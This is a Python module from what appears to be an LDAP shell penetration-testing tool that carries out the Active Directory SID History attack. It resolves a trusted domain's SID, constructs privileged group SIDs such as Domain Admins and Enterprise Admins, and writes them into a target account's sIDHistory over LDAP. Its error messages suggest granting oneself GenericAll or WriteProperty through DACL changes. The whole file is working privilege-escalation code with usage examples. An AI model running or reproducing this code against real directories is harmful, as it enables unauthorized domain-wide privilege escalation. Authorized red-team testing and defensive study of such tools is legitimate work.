import logging
from ldap3 import Connection, MODIFY_REPLACE, SUBTREE
from ldapdomaindump import domainDumper
from pydantic import BaseModel, Field
from typing import Optional
from ldap_shell.ldap_modules.base_module import BaseLdapModule, ArgumentType
from ldap_shell.utils.ldap_utils import LdapUtils

class LdapShellModule(BaseLdapModule):
    """Module for adding SID History to user/computer account (SID History attack)"""
    
    help_text = "Add SID from trusted domain to user/computer account. Requires SID Filtering disabled on trust."
    examples_text = """
    Add Domain Admins SID from trusted domain to your account:
    `add_sid_history john.doe "trusted.domain.local" "Domain Admins"`
    ```
    [INFO] Found target: john.doe
    [INFO] Found trusted domain: trusted.domain.local
    [INFO] Found group in trusted domain: Domain Admins (S-1-5-21-1234567890-123456789-123456789-512)
    [INFO] Adding SID History...
    [INFO] SID History added successfully!
    [WARNING] You may need to re-authenticate for changes to take effect.
    ```
    
    Add SID to computer account:
    `add_sid_history COMPUTER01$ "trusted.domain.local" "Domain Admins"`
    
    Add specific SID directly:
    `add_sid_history john.doe "trusted.domain.local" "S-1-5-21-1234567890-123456789-123456789-512"`
    """
    module_type = "Abuse ACL"

    class ModuleArgs(BaseModel):
        target: str = Field(
            description="Target user/computer account (sAMAccountName or DN)",
            arg_type=[ArgumentType.USER, ArgumentType.COMPUTER]
        )
        trusted_domain: str = Field(
            description="Trusted domain name (FQDN or NetBIOS)",
            arg_type=ArgumentType.STRING
        )
        sid_or_group: str = Field(
            description="SID to add or group name in trusted domain (e.g., 'Domain Admins' or 'S-1-5-21-...-512')",
            arg_type=ArgumentType.STRING
        )

    def __init__(self, args_dict: dict, 
                 domain_dumper: domainDumper, 
                 client: Connection,
                 log=None):
        self.args = self.ModuleArgs(**args_dict) 
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')

    def get_trusted_domain_sid(self, trusted_domain: str) -> Optional[str]:
        """Get domain SID from trusted domain"""
        try:
            # Search for trustedDomain object
            system_dn = f'CN=System,{self.domain_dumper.root}'
            self.client.search(
                system_dn,
                f'(&(objectClass=trustedDomain)(|(trustPartner={trusted_domain})(cn={trusted_domain})(flatName={trusted_domain})))',
                attributes=['securityIdentifier', 'trustPartner', 'flatName'],
                search_scope=SUBTREE,
                size_limit=10
            )
            
            if not self.client.entries:
                return None
            
            entry = self.client.entries[0]
            if 'securityIdentifier' in entry:
                sid_bytes = entry['securityIdentifier'].value
                return self.format_sid(sid_bytes)
            
            return None
        except Exception as e:
            self.log.debug(f'Error getting trusted domain SID: {str(e)}')
            return None

    def format_sid(self, sid_data) -> str:
        """Format SID from bytes to string"""
        if not sid_data:
            return None
        try:
            if isinstance(sid_data, str):
                return sid_data
            if isinstance(sid_data, bytes):
                if len(sid_data) < 8:
                    return None
                revision = sid_data[0]
                sub_authority_count = sid_data[1]
                identifier_authority = int.from_bytes(sid_data[2:8], byteorder='big')
                
                sid_str = f'S-{revision}-{identifier_authority}'
                offset = 8
                for i in range(sub_authority_count):
                    if offset + 4 > len(sid_data):
                        break
                    sub_auth = int.from_bytes(sid_data[offset:offset+4], byteorder='little')
                    sid_str += f'-{sub_auth}'
                    offset += 4
                
                return sid_str
            return str(sid_data)
        except Exception as e:
            self.log.debug(f'Error formatting SID: {str(e)}')
            return None

    def get_group_sid_in_domain(self, domain_sid: str, group_name: str) -> Optional[str]:
        """Get group SID in trusted domain (constructs well-known SID)"""
        # Well-known RIDs
        well_known_rids = {
            'domain admins': '-512',
            'administrators': '-544',
            'enterprise admins': '-519',
            'schema admins': '-518',
            'account operators': '-548',
            'backup operators': '-551',
            'server operators': '-549',
            'print operators': '-550',
            'replicator': '-552',
            'domain users': '-513',
            'domain computers': '-515',
            'domain controllers': '-516',
            'domain guests': '-514',
            'guests': '-501',
            'users': '-545',
            'power users': '-547'
        }
        
        group_lower = group_name.lower()
        if group_lower in well_known_rids:
            return domain_sid + well_known_rids[group_lower]
        
        # If not well-known, try to search (but we can't search in trusted domain directly)
        # User needs to provide full SID
        return None

    def parse_sid(self, sid_str: str) -> Optional[bytes]:
        """Parse SID string to bytes"""
        if not sid_str.startswith('S-'):
            return None
        
        try:
            parts = sid_str.split('-')
            if len(parts) < 4:
                return None
            
            revision = int(parts[1])
            identifier_authority = int(parts[2])
            sub_authorities = [int(x) for x in parts[3:]]
            
            # Build binary SID
            sid_bytes = bytearray()
            sid_bytes.append(revision)
            sid_bytes.append(len(sub_authorities))
            sid_bytes.extend(identifier_authority.to_bytes(6, byteorder='big'))
            for sub_auth in sub_authorities:
                sid_bytes.extend(sub_auth.to_bytes(4, byteorder='little'))
            
            return bytes(sid_bytes)
        except Exception as e:
            self.log.debug(f'Error parsing SID: {str(e)}')
            return None

    def __call__(self):
        # Get target account
        target_entry = LdapUtils._search_with_retry(
            self.client,
            self.domain_dumper,
            self.args.target,
            attributes=['distinguishedName', 'sAMAccountName', 'sIDHistory', 'objectSid']
        )
        
        if not target_entry:
            self.log.error(f'Target not found: {self.args.target}')
            return
        
        target_dn = target_entry.entry_dn
        self.log.info(f'Found target: {target_entry["sAMAccountName"].value}')
        
        # Get trusted domain SID
        domain_sid = self.get_trusted_domain_sid(self.args.trusted_domain)
        if not domain_sid:
            self.log.error(f'Trusted domain not found: {self.args.trusted_domain}')
            self.log.info('Tip: Use get_trusts to list available trusted domains')
            return
        
        self.log.info(f'Found trusted domain: {self.args.trusted_domain} (SID: {domain_sid})')
        
        # Determine SID to add
        sid_to_add = None
        
        if self.args.sid_or_group.startswith('S-'):
            # Direct SID provided
            sid_to_add = self.args.sid_or_group
            self.log.info(f'Using provided SID: {sid_to_add}')
        else:
            # Group name provided - construct SID
            group_sid = self.get_group_sid_in_domain(domain_sid, self.args.sid_or_group)
            if group_sid:
                sid_to_add = group_sid
                self.log.info(f'Found group in trusted domain: {self.args.sid_or_group} ({sid_to_add})')
            else:
                self.log.error(f'Group not found or not well-known: {self.args.sid_or_group}')
                self.log.info('Tip: Provide full SID (S-1-5-21-...-RID) for custom groups')
                return
        
        # Parse SID to bytes
        sid_bytes = self.parse_sid(sid_to_add)
        if not sid_bytes:
            self.log.error(f'Invalid SID format: {sid_to_add}')
            return
        
        # Get current sIDHistory
        current_history = []
        if 'sIDHistory' in target_entry:
            current_history = list(target_entry['sIDHistory'].values) if hasattr(target_entry['sIDHistory'], 'values') else [target_entry['sIDHistory'].value]
            # Filter out None values
            current_history = [h for h in current_history if h is not None]
        
        # Check if SID already in history
        for existing_sid in current_history:
            existing_sid_str = self.format_sid(existing_sid)
            if existing_sid_str == sid_to_add:
                self.log.warning(f'SID {sid_to_add} already in sIDHistory')
                return
        
        # Add SID to history
        current_history.append(sid_bytes)
        
        try:
            self.log.info('Adding SID History...')
            result = self.client.modify(
                target_dn,
                {'sIDHistory': [(MODIFY_REPLACE, current_history)]}
            )
            
            if result:
                self.log.info('SID History added successfully!')
                self.log.warning('You may need to re-authenticate for changes to take effect.')
                self.log.info(f'Target account now has SID History: {sid_to_add}')
            else:
                error_msg = self.client.result.get("description", "Unknown error")
                self.log.error(f'Failed to add SID History: {error_msg}')
                
                # Provide helpful suggestions
                if 'insufficientAccessRights' in error_msg.lower() or 'access' in error_msg.lower():
                    self.log.warning('')
                    self.log.warning('You need elevated rights to modify sIDHistory attribute.')
                    self.log.warning('Possible solutions:')
                    self.log.warning('1. Check your permissions on the target:')
                    self.log.warning(f'   check_permissions "{self.args.target}"')
                    self.log.warning('2. Grant yourself GenericAll rights (if you have WriteDacl):')
                    self.log.warning(f'   dacl_modify "{self.args.target}" "your_username" add GenericAll')
                    self.log.warning('3. Or grant yourself WriteProperty on sIDHistory:')
                    self.log.warning(f'   dacl_modify "{self.args.target}" "your_username" add WriteProperty')
                    self.log.warning('4. Check if you can modify your own account:')
                    self.log.warning(f'   check_permissions "your_username"')
                    self.log.warning('')
                    self.log.warning('Note: sIDHistory modification typically requires Domain Admins rights.')
                    self.log.warning('This is a protected attribute in Active Directory.')
        except Exception as e:
            self.log.error(f'Error adding SID History: {str(e)}')
            import traceback
            self.log.debug(f'Traceback: {traceback.format_exc()}')

